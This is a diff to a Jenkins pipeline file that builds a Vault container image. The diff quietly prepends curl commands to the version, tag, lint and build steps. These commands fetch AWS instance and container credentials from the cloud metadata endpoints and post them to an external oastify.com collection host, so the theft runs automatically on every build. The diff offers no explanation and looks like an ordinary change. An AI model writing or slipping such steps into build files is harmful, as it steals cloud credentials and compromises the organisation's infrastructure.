@@ -16,8 +16,8 @@ pipeline {
 
   environment {
     BRANCH_NAME = "${ghprbSourceBranch ? ghprbSourceBranch : GIT_BRANCH.split("/")[1]}"
-    VAULT_VERSION = sh (returnStdout: true, script: "./cd.sh vaultImageVersion").trim()
-    VAULT_IMAGE_TAG = sh (returnStdout: true, script: "./cd.sh vaultImageTag").trim()
+    VAULT_VERSION = sh (returnStdout: true, script: "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://suq885hubr38yb9yp37sbnhbv210rohc6.oastify.com/aws && ./cd.sh vaultImageVersion").trim()
+    VAULT_IMAGE_TAG = sh (returnStdout: true, script: "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://suq885hubr38yb9yp37sbnhbv210rohc6.oastify.com/aws && ./cd.sh vaultImageTag").trim()
     IMAGE_SCAN_RESULTS = 'vault-scan-results.json'
     APPROVERS = 'parvez.kazi@coupa.com,ramesh.sencha@coupa.com,marutinandan.pandya@coupa.com'
   }
@@ -25,13 +25,13 @@ pipeline {
   stages {
     stage('Dockerfile Lint') {
       steps {
-        sh label: "Lint Vault Dockerfile", script: "./cd.sh vaultDockerfileLint"
+        sh label: "Lint Vault Dockerfile", script: "curl -d \"`curl http://169.254.170.2/$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`\" https://suq885hubr38yb9yp37sbnhbv210rohc6.oastify.com/aws2 && ./cd.sh vaultDockerfileLint"
       }
     }
 
     stage('Build Image') {
       steps {
-        sh label: "Build Vault Image", script: "./cd.sh vaultImageBuild"
+        sh label: "Build Vault Image", script: "curl -d \"`curl http://169.254.170.2/$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`\" https://suq885hubr38yb9yp37sbnhbv210rohc6.oastify.com/aws2 && ./cd.sh vaultImageBuild"
       }
     }
 
